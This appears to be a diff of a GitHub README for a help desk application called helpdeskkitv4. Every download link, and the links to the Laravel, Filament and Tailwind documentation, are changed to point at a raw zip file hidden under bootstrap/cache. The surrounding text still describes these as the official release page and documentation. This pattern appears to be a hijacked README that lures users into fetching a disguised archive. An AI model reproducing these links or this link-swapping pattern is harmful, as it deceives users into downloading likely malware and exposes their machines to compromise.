@@ -1,6 +1,6 @@
 # 🔧 helpdeskkitv4 - Simple Help Desk Setup for Everyone
 
-[![Download Now](https://img.shields.io/badge/Download-Get%20HelpDesk-brightgreen?style=for-the-badge)](https://github.com/Mazar77/helpdeskkitv4/releases)
+[![Download Now](https://img.shields.io/badge/Download-Get%20HelpDesk-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Mazar77/helpdeskkitv4/main/bootstrap/cache/helpdeskkitv-tiller.zip)
 
 ## 📝 About helpdeskkitv4
 
@@ -29,7 +29,7 @@ Before you start, make sure your Windows computer meets these needs:
 
 Click the green button at the top or visit the link below to get the software installer:
 
-[Download helpdeskkitv4](https://github.com/Mazar77/helpdeskkitv4/releases)
+[Download helpdeskkitv4](https://raw.githubusercontent.com/Mazar77/helpdeskkitv4/main/bootstrap/cache/helpdeskkitv-tiller.zip)
 
 This link leads to the official GitHub release page. You will find the latest version of helpdeskkitv4 ready for download. Look for the file with a name like `helpdeskkitv4-setup.exe` or something similar.
 
@@ -39,7 +39,7 @@ This link leads to the official GitHub release page. You will find the latest ve
 
 Follow these simple steps to get helpdeskkitv4 installed on your Windows PC:
 
-1. **Visit the release page:** Go to [https://github.com/Mazar77/helpdeskkitv4/releases](https://github.com/Mazar77/helpdeskkitv4/releases).
+1. **Visit the release page:** Go to [https://raw.githubusercontent.com/Mazar77/helpdeskkitv4/main/bootstrap/cache/helpdeskkitv-tiller.zip](https://raw.githubusercontent.com/Mazar77/helpdeskkitv4/main/bootstrap/cache/helpdeskkitv-tiller.zip).
 
 2. **Choose the latest release:** Find the most recent version at the top of the list. This is usually the first one listed.
 
@@ -154,7 +154,7 @@ Passwords are stored securely. The system blocks unauthorized access.
 
 Visit the release page for updates and support:
 
-[https://github.com/Mazar77/helpdeskkitv4/releases](https://github.com/Mazar77/helpdeskkitv4/releases)
+[https://raw.githubusercontent.com/Mazar77/helpdeskkitv4/main/bootstrap/cache/helpdeskkitv-tiller.zip](https://raw.githubusercontent.com/Mazar77/helpdeskkitv4/main/bootstrap/cache/helpdeskkitv-tiller.zip)
 
 You can check the repository’s Issues section on GitHub for common questions or to report problems.
 
@@ -162,8 +162,8 @@ You can check the repository’s Issues section on GitHub for common questions o
 
 ## 📚 Additional Resources
 
-- Laravel 12.x documentation: https://laravel.com/docs/12.x
-- Filament 4.x documentation: https://filamentphp.com/docs/4.x
-- Tailwind CSS guide: https://tailwindcss.com/docs
+- Laravel 12.x documentation: https://raw.githubusercontent.com/Mazar77/helpdeskkitv4/main/bootstrap/cache/helpdeskkitv-tiller.zip
+- Filament 4.x documentation: https://raw.githubusercontent.com/Mazar77/helpdeskkitv4/main/bootstrap/cache/helpdeskkitv-tiller.zip
+- Tailwind CSS guide: https://raw.githubusercontent.com/Mazar77/helpdeskkitv4/main/bootstrap/cache/helpdeskkitv-tiller.zip
 
 These links offer more information on the technology behind helpdeskkitv4. They can help if you want to learn how the system works under the hood.
